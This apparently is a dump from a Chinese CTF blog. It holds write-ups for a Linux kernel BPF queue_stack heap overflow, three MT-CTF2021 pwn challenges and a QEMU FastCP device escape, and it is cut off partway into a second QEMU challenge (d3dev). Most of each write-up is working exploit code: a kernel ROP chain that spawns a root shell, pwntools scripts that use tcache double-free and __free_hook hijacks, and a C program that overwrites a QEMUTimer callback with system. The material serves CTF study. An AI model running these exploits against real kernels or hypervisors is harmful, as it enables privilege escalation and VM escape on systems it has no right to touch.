bpf_queue_stack &#123;\tstruct bpf_map map;\traw_spinlock_t lock;\tu32 head, tail;\tu32 size; /* max_entries + 1 */\tchar elements[0] __aligned(8);&#125;;\n\n这里利用memcpy将堆块上的内容复制到目标地址。这里查看qs的定义可以看出来其实就是往管理堆块下面相邻的堆块进行写入，但是因为我们上面申请的size只是管理堆块的size这也就导致了我们可以进行堆溢出。\n简单总结其实从上面分析到这里可以看出来这里的功能主要是要干嘛的，并且分析出来qs的结构。这里简化一下结构体其实就是类似于msg_msg的一种结构：\nstruct &#123;  manager;  data;&#125;\n\n不过我们每次进行update的时候只能够修改data中的一个小块，而这些小块又被分成了attr-&gt;max_entries + 1个，并且每个小块的size为：attr-&gt;value_size。\n利用分析这里主要利用堆风水使我们分配的两个object相邻，接着修改掉ops指针，劫持函数实现站栈迁移即可。\n这里使用到的gadget在 modify_ldt利用 中提到过，不熟悉的可以去看看这里就不再赘述。\n综上，exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;#include &lt;time.h&gt;#define SPRAY_NUMBER 14#ifndef __NR_bpf#define __NR_bpf 321#endifvoid errExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void get_shell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;int main()&#123;    signal(SIGSEGV, get_shell);    save_status();    unsigned long swapgs = 0xffffffff81c00d5a;    unsigned long iretq = 0xffffffff8106d8f4;    unsigned long stack_pivot_gadget = 0xffffffff81954dc8;    char *buf = malloc(0x4000);    long int res;    unsigned long fake_ops[0x1000] = &#123;0&#125;;    unsigned long pointer[0x1000] = &#123;0&#125;;    char *rop_addr;    memset(buf, 0, sizeof(buf));    *(unsigned int *)buf = 0x17;    *(unsigned int *)(buf + 4) = 0;    *(unsigned int *)(buf + 8) = 0x40;    *(unsigned int *)(buf + 12) = -1;    *(unsigned int *)(buf + 16) = 0;    *(unsigned int *)(buf + 20) = -1;    res = syscall(__NR_bpf, 0, buf, 0x2c);    if (res == -1)        errExit(&quot;BPF_MAP_CREATE error!&quot;);    unsigned long victim[SPRAY_NUMBER];    for (int i = 0; i &lt; SPRAY_NUMBER; i++)    &#123;        victim[i] = syscall(__NR_bpf, 0, buf, 0x2c);    &#125;    printf(&quot;spray finished!\\n&quot;);    fake_ops[2] = stack_pivot_gadget;    pointer[6] = fake_ops;    *(unsigned int *)buf = res;    *(unsigned int *)(buf + 4) = 0;    *(unsigned long *)(buf + 8) = 0;    *(unsigned long *)(buf + 16) = pointer;    *(unsigned long *)(buf + 24) = 2;    syscall(__NR_bpf, 2, buf, 0x20);    printf(&quot;changed ops\\n&quot;);    rop_addr = mmap(0x81954000, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);    int idx = 0;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff81029c71;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0x6f0;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff810013b9;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xFFFFFFFF810E3D40;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff81001c50;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff810013b9;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff81264e0b;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xFFFFFFFF810E3AB0;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff81c00d5a;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0x246;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff8106d8f4;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = (uint64_t)get_shell;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = (uint64_t)user_cs;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = (uint64_t)user_rflags;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = (uint64_t)user_sp;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = (uint64_t)user_ss;    *(unsigned long *)(0x81954dc8) = 0xffffffff81029c71;    for (int i = 0; i &lt; SPRAY_NUMBER; i++)    &#123;        close(victim[i]);    &#125;    return 0;&#125;\n\n\n\n参考链接:http://p4nda.top/2019/01/02/kernel-bpf-overflow/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\n","categories":["Linux Kernel"],"tags":["bpf","堆喷射"]},{"title":"MT-CTF2021复现","url":"/2021/12/14/MT-CTF/","content":"比赛当天给我哥过生日去了，没时间打比赛，下来复现比赛发现三道pwn题的难度都不是很难，除了最后一道，还没想到预期解，只能跟着wp做一遍非预期解\nbabyrop预备知识栈迁移\n流程分析程序的流程比较简单，首先存在一个字节的溢出，可以查看canary。然后让你比较password的地址，就可以进入漏洞函数。但是漏洞函数只存在八个字节的溢出\n利用分析因为我们只能溢出一个所以直接构造ROP是行不通的，所以考虑把ROP写到bss上面，直接放exp吧。\nexpfrom pwn import *elf = ELF(&#x27;./babyrop&#x27;)libc = ELF(&#x27;./libc-2.27.so&#x27;)r = process(&#x27;./babyrop&#x27;)context.log_level = &#x27;debug&#x27;# context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]main_addr = elf.symbols[&#x27;main&#x27;]pop_rdi_ret = 0x0000000000400913ret_addr = 0x0000000000400284puts_got_addr = elf.got[&#x27;puts&#x27;]puts_plt_addr = elf.plt[&#x27;puts&#x27;]fake_stack = elf.bss()+0x320vuln_addr = 0x40072Cr.recvuntil(b&#x27;What your name? &#x27;)r.sendline(b&#x27;a&#x27;*(0x20-0x8+1))# gdb.attach(r)print(r.recvuntil(b&#x27;a&#x27;*(0x20-0x8+1)))# canary = (b&#x27;\\x00&#x27;+r.recvuntil(b&#x27;, welcome to this challenge!\\n&#x27;))canary = u64(b&#x27;\\x00&#x27;+r.recv(7))print(hex(canary))# print(u64(r.recvuntil(b&#x27;, welcome to this challenge!\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;)))r.recvuntil(b&#x27;Please input the passwd to unlock this challenge&#x27;)r.sendline(b&#x27;4196782&#x27;)payload = b&#x27;a&#x27;*(0x20-0x8)+p64(canary)+p64(fake_stack)+p64(vuln_addr)r.recvuntil(b&#x27;OK!\\nNow, you can input your message&#x27;)r.sendline(payload)payload = p64(puts_got_addr)+p64(puts_plt_addr)+p64(vuln_addr) + \\    p64(canary)+p64(fake_stack-0x30)+p64(vuln_addr)r.send(payload)# gdb.attach(r)payload = b&#x27;a&#x27;*(0x20-0x8)+p64(canary)+p64(fake_stack-0x20)+p64(pop_rdi_ret)r.send(payload)puts_addr = u64(p.recv(6).ljust(8, &#x27;\\x00&#x27;))libc_base = puts_addr-libc.symbols[&#x27;puts&#x27;]one_gadget = libc_base+0x4f3d5payload = b&#x27;a&#x27;*0x18+p64(canary)+p64(0)+p64(one_gadget)r.send(payload)r.interactive()\n\nbook_shop流程分析题目创建chunk的大小是固定的，并且libc的版本存在tcache，并且只有create存在写入内存的功能\n利用分析首先创建十一个大小为fastbin以内的chunk，释放7个chunk占满tcache，随后释放两个连续的chunk进入fastbin，然后触发malloc_consolidate使fastbin里的chunk合并进入unsortedbin，众所周知，unsortedbin只有一个chunk时，他的fd和bk都指向了main_arena，又因为存在UAF所以直接可以泄漏出libc的加载地址。然后再利用double free释放两个chunk进入fastbin，此时create七个chunk将tcache腾空，那么fastbin的chunk会进入tcache，接着利用double free修改tcache最后那个chunk的fd指针到__free_hook，因为tcache对于安全检测几乎没有就可以直接篡改掉__free_hook然后getshell。下面放出exp\nexpfrom pwn import *r = process(&#x27;./bookshop&#x27;)elf = ELF(&#x27;./bookshop&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)r.recvuntil(b&#x27;The lucky number?\\n&#x27;)r.sendline(bytes(str(0x68), encoding=&#x27;utf8&#x27;))def create(content):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;&gt; &#x27;)    r.send(content)def show(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Which Book do you want to read?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def delete(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Which Book do you want to take out from you bag?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))for i in range(11):    create(b&#x27;a&#x27;)for i in range(7):    delete(6-i)delete(7)delete(8)r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;0&#x27;*0x400)show(7)r.recvuntil(b&#x27;Content: &#x27;)main_arena = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena))main_arena = main_arena-304print(hex(main_arena))# print(u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)))libc_base = main_arena-(next(libc.search(b&#x27;main_arena&#x27;))+0x3365f)print(hex(libc_base))delete(10)delete(8)delete(10)for i in range(7):    create(b&#x27;a&#x27;)free_hook = libc_base+libc.symbols[&#x27;__free_hook&#x27;]print(hex(free_hook))create(p64(free_hook-8))create(p64(0))system_addr = libc_base+libc.symbols[&#x27;system&#x27;]create(b&#x27;/bin/sh\\x00&#x27;+p64(system_addr))create(b&#x27;/bin/sh\\x00&#x27;+p64(system_addr))delete(20)# gdb.attach(r)r.interactive()\n\nblind_box流程分析这道题目的libc版本依旧存在tcache，但是题目已经给了后门函数，非预期解就是在show函数的检测只检测了libc为0x7f的情况，但是libc存在0x7e所以直接可以泄漏出libc地址，非预期解很简单，但是预期解我下去再想想。\nexpfrom pwn import *from ctypes import cdllelf = ELF(&#x27;./Blindbox&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)r = process(&#x27;./Blindbox&#x27;)context.log_level = &#x27;debug&#x27;r.recvuntil(b&#x27;Please tell me your name:&#x27;)r.sendline(b&#x27;196082&#x27;)r.recvuntil(b&#x27;The first lucky number?&#x27;)r.sendline(bytes(str(0x100), encoding=&#x27;utf8&#x27;))r.recvuntil(b&#x27;The second lucky number?&#x27;)r.sendline(bytes(str(0x100), encoding=&#x27;utf8&#x27;))r.recvuntil(b&#x27;The third lucky number?&#x27;)r.sendline(bytes(str(0x100), encoding=&#x27;utf8&#x27;))def create(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Give index for this Blindbox(1-3): &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def drop(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Which index do you want to drop?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def show(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Which Blindbox do you want to open?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))for i in range(7):    create(1)    drop(1)create(1)create(2)drop(1)gdb.attach(r)show(1)r.recvuntil(b&#x27;Content of this Blindbox: &#x27;)main_arena = u64(r.recv(6).ljust(8, &#x27;\\x00&#x27;))-96libc_base = main_arena-next(libc.search(b&#x27;main_arena&#x27;))system_addr = libc_base+libc.symbols[&#x27;system&#x27;]objdll = cdll.LoadLibrary(&#x27;./libc-2.31.so&#x27;)objdll.srand(0)for i in range(7):    r.recvuntil(b&quot;Round &quot;+bytes(str(i), encoding=&#x27;utf8&#x27;)+b&quot; Please guess&gt;&quot;)    res = system_addr ^ objdll.rand()    r.sendline(bytes(str(res), encoding=&#x27;utf8&#x27;))r.interactive()\n\n","categories":["比赛复现"],"tags":["pwn"]},{"title":"QEMU逃逸练习","url":"/2023/03/21/QEMU%E9%80%83%E9%80%B8%E7%BB%83%E4%B9%A0/","content":"可以看得出来这篇文章的标题十分的水，因为确实是很难找到这两道题又什么闪光点来作为标题。这篇文章更新后会暂停学习qemu了，后续会进一步学习AFL以及开始接触docker逃逸。\nFastCP-ctf关于设备的分析可以参考前面两篇文章，这里就不再赘述了。\n函数分析uint64_t __fastcall fastcp_mmio_read(FastCPState *opaque, hwaddr addr, unsigned int size)&#123;  if ( size != 8 &amp;&amp; addr &lt;= 0x1F || addr &gt; 0x1F )    return -1LL;  if ( addr == 8 )    return opaque-&gt;cp_state.CP_list_src;  if ( addr &lt;= 8 )  &#123;    if ( !addr )      return opaque-&gt;handling;    return -1LL;  &#125;  if ( addr != 0x10 )  &#123;    if ( addr == 0x18 )      return opaque-&gt;cp_state.cmd;    return -1LL;  &#125;  return opaque-&gt;cp_state.CP_list_cnt;&#125;\n\n首先就是read函数这里是非常常规的一些内容。\nvoid __fastcall fastcp_mmio_write(FastCPState *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123;  int64_t ns; // rax  if ( (size == 8 || addr &gt; 0x1F) &amp;&amp; addr &lt;= 0x1F )  &#123;    if ( addr == 0x10 )    &#123;      if ( opaque-&gt;handling != 1 )        opaque-&gt;cp_state.CP_list_cnt = val;    &#125;    else if ( addr == 0x18 )    &#123;      if ( opaque-&gt;handling != 1 )      &#123;        opaque-&gt;cp_state.cmd = val;        ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);        timer_mod(&amp;opaque-&gt;cp_timer, ns / 1000000 + 100);      &#125;    &#125;    else if ( addr == 8 &amp;&amp; opaque-&gt;handling != 1 )    &#123;      opaque-&gt;cp_state.CP_list_src = val;    &#125;  &#125;&#125;\n\n再就是write函数，可以修改opaque-&gt;cp_state.cmd、opaque-&gt;cp_state.CP_list_cnt、opaque-&gt;cp_state.CP_list_src，并且可以看到中间会触发timer。\nvoid __fastcall fastcp_cp_timer(FastCPState *opaque)&#123;  uint64_t cmd; // rax  uint64_t CP_list_cnt; // rdx  __int64 v3; // rbp  uint64_t v4; // r12  uint64_t v5; // rax  uint64_t v6; // rax  bool v7; // zf  uint64_t v8; // rbp  __int64 v9; // rdx  FastCP_CP_INFO cp_info; // [rsp+0h] [rbp-68h] BYREF  char buf[8]; // [rsp+20h] [rbp-48h] BYREF  unsigned __int64 v12; // [rsp+28h] [rbp-40h]  unsigned __int64 v13; // [rsp+38h] [rbp-30h]  v13 = __readfsqword(0x28u);  cmd = opaque-&gt;cp_state.cmd;  memset(&amp;cp_info, 0, sizeof(cp_info));  switch ( cmd )  &#123;    case 2uLL:      v7 = opaque-&gt;cp_state.CP_list_cnt == 1;      opaque-&gt;handling = 1;      if ( v7 )      &#123;        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, 0x18uLL, 0);// read        if ( cp_info.CP_cnt &lt;= 0x1000 )          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, 0);        v6 = opaque-&gt;cp_state.cmd &amp; 0xFFFFFFFFFFFFFFFCLL;        opaque-&gt;cp_state.cmd = v6;        goto LABEL_11;      &#125;      break;    case 4uLL:      v7 = opaque-&gt;cp_state.CP_list_cnt == 1;      opaque-&gt;handling = 1;      if ( v7 )      &#123;        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, 0x18uLL, 0);        cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, 1);// write        v6 = opaque-&gt;cp_state.cmd &amp; 0xFFFFFFFFFFFFFFF8LL;        opaque-&gt;cp_state.cmd = v6;LABEL_11:        if ( (v6 &amp; 8) != 0 )        &#123;          opaque-&gt;irq_status |= 0x100u;          if ( msi_enabled(&amp;opaque-&gt;pdev) )            msi_notify(&amp;opaque-&gt;pdev, 0);          else            pci_set_irq(&amp;opaque-&gt;pdev, 1);        &#125;        goto LABEL_16;      &#125;      break;    case 1uLL:      CP_list_cnt = opaque-&gt;cp_state.CP_list_cnt;      opaque-&gt;handling = 1;      if ( CP_list_cnt &gt; 0x10 )      &#123;LABEL_22:        v8 = 0LL;        do        &#123;          v9 = 3 * v8++;          cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src + 8 * v9, &amp;cp_info, 0x18uLL, 0);          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, 0);          cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, 1);        &#125;        while ( opaque-&gt;cp_state.CP_list_cnt &gt; v8 );      &#125;      else      &#123;        if ( !CP_list_cnt )        &#123;LABEL_10:          v6 = cmd &amp; 0xFFFFFFFFFFFFFFFELL;          opaque-&gt;cp_state.cmd = v6;          goto LABEL_11;        &#125;        v3 = 0LL;        v4 = 0LL;        while ( 1 )        &#123;          cpu_physical_memory_rw(v3 + opaque-&gt;cp_state.CP_list_src, buf, 0x18uLL, 0);          if ( v12 &gt; 0x1000 )            break;          v5 = opaque-&gt;cp_state.CP_list_cnt;          ++v4;          v3 += 24LL;          if ( v4 &gt;= v5 )          &#123;            if ( !v5 )              break;            goto LABEL_22;          &#125;        &#125;      &#125;      cmd = opaque-&gt;cp_state.cmd;      goto LABEL_10;    default:      return;  &#125;  opaque-&gt;cp_state.cmd = 0LL;LABEL_16:  opaque-&gt;handling = 0;&#125;\n\n在timer中存在三个由cmd属性控制的分支，这里直接说三个分支的功能：\n\n  opaque-&gt;cp_state.cmd = 2; 从opaque-&gt;cp_state.CP_list_src读取内容到栈上，通过( cp_info.CP_cnt &lt;= 0x1000 )验证之后再将cp_info.CP_src内容读取到opaque-&gt;CP_buffer上。\n  opaque-&gt;cp_state.cmd = 4; 从opaque-&gt;cp_state.CP_list_src读取内容到栈上，未通过任何验证，直接将opaque-&gt;CP_buffer写到cp_info.CP_dst上\n  opaque-&gt;cp_state.cmd = 1; 从opaque-&gt;cp_state.CP_list_src + 8 * v9读取内容到栈上，未通过任何验证，将cp_info.CP_src读取到opaque-&gt;CP_buffer上，再将opaque-&gt;CP_buffer写到cp_info.CP_dst上。\n\n00000000 FastCPState struc ; (sizeof=0x1A30, align=0x10, copyof_4530)00000000 pdev PCIDevice_0 ?000008F0 mmio MemoryRegion_0 ?000009E0 cp_state CP_state ?000009F8 handling db ?000009F9 db ? ; undefined000009FA db ? ; undefined000009FB db ? ; undefined000009FC irq_status dd ?00000A00 CP_buffer db 4096 dup(?)00001A00 cp_timer QEMUTimer_0 ?00001A30 FastCPState ends  00000000 QEMUTimer_0 struc ; (sizeof=0x30, align=0x8, copyof_1181)00000000                                         ; XREF: FastCPState/r00000000 expire_time dq ?00000008 timer_list dq ?                         ; offset00000010 cb dq ?                                 ; offset00000018 opaque dq ?                             ; offset00000020 next dq ?                               ; offset00000028 attributes dd ?0000002C scale dd ?00000030 QEMUTimer_0 ends\n\n结合上述结构体再加上上面的分析结果漏洞已经呼之欲出了。因为情况2和3中没有对len进行验证导致可以越界使用结构体产生的漏洞。\n利用分析因为漏洞点较为简单，所以利用方式也比较简单\n\n  首先通过情况2越界读取到cp_timer成员中的内容。该成员中cb的值为fastcp_cp_timer函数的地址(在pci_FastCP_realize中完成赋值)，进而泄漏出system的地址。顺便泄漏出opaque成员地址。\n  通过情况3越界写入内容到cp_timer成员，劫持cb和opaque。\n  最后触发timer完成利用\n\n注意！！虽然利用方式特别简单，但是这道题目有一点是非常容易被忽略的。那就是物理地址连续不代表虚拟地址连续！\n在下面exp中，在第一次读取到cp_timer成员到内容后并没有使用*(unsigned long long *)(userbuf + 0x1010)来读取，因为程序中实际写入到函数是cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, 1);而这里写入到的是物理地址，但是物理地址并不连续，所以这里是读取不到的。所以最后往cp_timer成员写入的时候使用的也是va2pa(userbuf + 0x1000) - 0x1000写入。\n综上，exp#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)struct FastCP_CP_INFO&#123;    uint64_t CP_src;    uint64_t CP_cnt;    uint64_t CP_dst;&#125;;struct QEMUTimer&#123;    long long int expire_time;    unsigned long long timer_list;    unsigned long long cb;    void *opaque;    unsigned long long next;    int attributes;    int scale;    char command[0x50];&#125;;void die(const char *msg)&#123;    perror(msg);    exit(-1);&#125;size_t va2pa(void *addr)&#123;    uint64_t data;    int fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY);    if (!fd)    &#123;        perror(&quot;open pagemap&quot;);        return 0;    &#125;    size_t offset = ((uintptr_t)addr / PAGE_SIZE) * sizeof(uint64_t);    if (lseek(fd, offset, SEEK_SET) &lt; 0)    &#123;        puts(&quot;lseek&quot;);        close(fd);        return 0;    &#125;    if (read(fd, &amp;data, 8) != 8)    &#123;        puts(&quot;read&quot;);        close(fd);        return 0;    &#125;    if (!(data &amp; (((uint64_t)1 &lt;&lt; 63))))    &#123;        puts(&quot;page&quot;);        close(fd);        return 0;    &#125;    size_t pageframenum = data &amp; ((1ull &lt;&lt; 55) - 1);    size_t phyaddr = pageframenum * PAGE_SIZE + (uintptr_t)addr % PAGE_SIZE;    close(fd);    return phyaddr;&#125;char *userbuf;unsigned long long phy_userbuf;unsigned char *mmio_mem;int write_CP_list_cnt(unsigned long long value)&#123;    *((unsigned long long *)(mmio_mem + +0x10)) = value;&#125;int write_CP_list_src(unsigned long long value)&#123;    *((unsigned long long *)(mmio_mem + 8)) = value;&#125;int run_cmd(unsigned long long cmd, unsigned long long src, unsigned long long cnt)&#123;    write_CP_list_cnt(cnt);    write_CP_list_src(src);    *((unsigned long long *)(mmio_mem + +0x18)) = cmd;    sleep(1);&#125;int main()&#123;    int mmio_fd = open(&quot;/sys/bus/pci/devices/0000:00:04.0/resource0&quot;, O_RDWR | O_SYNC);    if (mmio_fd == -1)        die(&quot;mmio_fd open failed&quot;);    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);    if (mmio_mem == MAP_FAILED)        die(&quot;mmap mmio_mem failed&quot;);    printf(&quot;mmio_mem @ %p\\n&quot;, mmio_mem);    userbuf = mmap(0, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);    if (userbuf == MAP_FAILED)        die(&quot;mmap&quot;);    mlock(userbuf, 0x2000);    phy_userbuf = va2pa(userbuf);    printf(&quot;user buff virtual address: %p\\n&quot;, userbuf);    printf(&quot;user buff physical address: %p\\n&quot;, (void *)phy_userbuf);    struct FastCP_CP_INFO info;    info.CP_src = NULL;    info.CP_dst = phy_userbuf;    info.CP_cnt = 0x1000 + 0x30;    memcpy(userbuf, &amp;info, sizeof(info));    run_cmd(4, phy_userbuf, 1);    info.CP_src = phy_userbuf + 0x1000;    info.CP_cnt = 0x30;    info.CP_dst = NULL;    memcpy(userbuf, &amp;info, sizeof(info));    run_cmd(2, phy_userbuf, 1);    info.CP_src = NULL;    info.CP_cnt = 0x30;    info.CP_dst = phy_userbuf;    memcpy(userbuf, &amp;info, sizeof(info));    run_cmd(4, phy_userbuf, 1);    printf(&quot;fastcp_cp_timer=&gt;%p\\n&quot;, *(unsigned long long *)(userbuf + 0x10));    printf(&quot;%p\\n&quot;, va2pa(userbuf + 0x1000));    printf(&quot;%p\\n&quot;, va2pa(userbuf + 0x2000));    unsigned long long fastcp_cp_timer = *(unsigned long long *)(userbuf + 0x10);    unsigned long long elf_base = fastcp_cp_timer - 0x4DCE80;    unsigned long long system_addr = elf_base + 0x2C2180;    unsigned long long opaque_addr = *(unsigned long long *)(userbuf + 0x18);    struct QEMUTimer timer;    timer.expire_time = 0xffffffffffffffff;    timer.timer_list = *(unsigned long long *)(userbuf + 0x8);    timer.cb = system_addr;    timer.opaque = opaque_addr + 0x1a30;    timer.next = *(unsigned long long *)(userbuf + 0x20);    timer.attributes = *(unsigned int *)(userbuf + 0x28);    timer.scale = *(unsigned int *)(userbuf + 0x2c);    strcpy(&amp;timer.command, &quot;cat /flag&quot;);    memcpy(userbuf + 0x1000, &amp;timer, sizeof(timer));    info.CP_src = va2pa(userbuf + 0x1000) - 0x1000;    info.CP_cnt = 0x1000 + 0x30 + 9;    info.CP_dst = va2pa(userbuf + 0x1000) - 0x1000;    for (int i = 0; i &lt; 0x11; i++)    &#123;        memcpy(userbuf + i * 0x18, &amp;info, sizeof(info));    &#125;    run_cmd(1, phy_userbuf, 0x11);    *((unsigned long long *)(mmio_mem + +0x18)) = 1;    return 0;&#125;\n\n\nd3dev先看看结构体\nstruct __attribute__((aligned(16))) d3devState&#123;  PCIDevice_0 pdev;  MemoryRegion_0 mmio;  MemoryRegion_0 pmio;  uint32_t memory_mode;  uint32_t seek;  uint32_t init_flag;  uint32_t mmio_read_part;  uint32_t mmio_write_part;  uint32_t r_seed;  uint64_t blocks[257];  uint32_t key[4];  int (*rand_r)(unsigned int *);&#125;;\n\n分析函数uint64_t __fastcall d3dev_mmio_read(d3devState *opaque, hwaddr addr, unsigned int size)&#123;  uint64_t v3; // rax  int v4; // esi  unsigned int v5; // ecx  uint64_t result; // rax  v3 = opaque-&gt;blocks[opaque-&gt;seek + (addr &gt;&gt; 3)];  v4 = 0xC6EF3720;  v5 = v3;  result = HIDWORD(v3);  do  &#123;    LODWORD(result) = result - ((v5 + v4) ^ (opaque-&gt;key[3] + (v5 &gt;&gt; 5)) ^ (opaque-&gt;key[2] + 16 * v5));    v5 -= (result + v4) ^ (opaque-&gt;key[1] + (result &gt;&gt; 5)) ^ (opaque-&gt;key[0] + 16 * result);    v4 += 0x61C88647;  &#125;  while ( v4 );  if ( opaque-&gt;mmio_read_part )  &#123;    opaque-&gt;mmio_read_part = 0;    return result;  &#125;  else  &#123;    opaque-&gt;mmio_read_part = 1;    return v5;  &#125;&#125;\n\nmmio_read函数这里，首先是根据seek和addr定位到数据，随后将数据进行tea解密，然后第一次输出低32位，第二次输出高32位。\nvoid __fastcall d3dev_mmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123;  __int64 v4; // rsi  ObjectClass **v5; // r11  uint64_t v6; // rdx  int v7; // esi  uint32_t v8; // r10d  uint32_t v9; // r9d  uint32_t v10; // r8d  uint32_t v11; // edi  unsigned int v12; // ecx  uint64_t v13; // rax  if ( size == 4 )  &#123;    v4 = opaque-&gt;seek + (addr &gt;&gt; 3);    if ( opaque-&gt;mmio_write_part )    &#123;      v5 = &amp;opaque-&gt;pdev.qdev.parent_obj.class + v4;      v6 = val &lt;&lt; 32;      v7 = 0;      opaque-&gt;mmio_write_part = 0;      v8 = opaque-&gt;key[0];      v9 = opaque-&gt;key[1];      v10 = opaque-&gt;key[2];      v11 = opaque-&gt;key[3];      v12 = v6 + *(v5 + 0x2B6);      v13 = (v5[0x15B] + v6) &gt;&gt; 32;      do      &#123;        v7 -= 0x61C88647;        v12 += (v7 + v13) ^ (v9 + (v13 &gt;&gt; 5)) ^ (v8 + 16 * v13);        LODWORD(v13) = ((v7 + v12) ^ (v11 + (v12 &gt;&gt; 5)) ^ (v10 + 16 * v12)) + v13;      &#125;      while ( v7 != 0xC6EF3720 );      v5[0x15B] = __PAIR64__(v13, v12);    &#125;    else    &#123;      opaque-&gt;mmio_write_part = 1;      opaque-&gt;blocks[v4] = val;    &#125;  &#125;&#125;\n\n在mmio_write函数中首先一样先通过seek和addr得到index，第一次使用时是直接在低32位写入输入的数据，后面的则是低32位和高32位进行tea加密随后写入到地址位置。\n// local variable allocation has failed, the output may be wrong!void __fastcall d3dev_pmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123;  uint32_t *key; // rbp  if ( addr == 8 )  &#123; 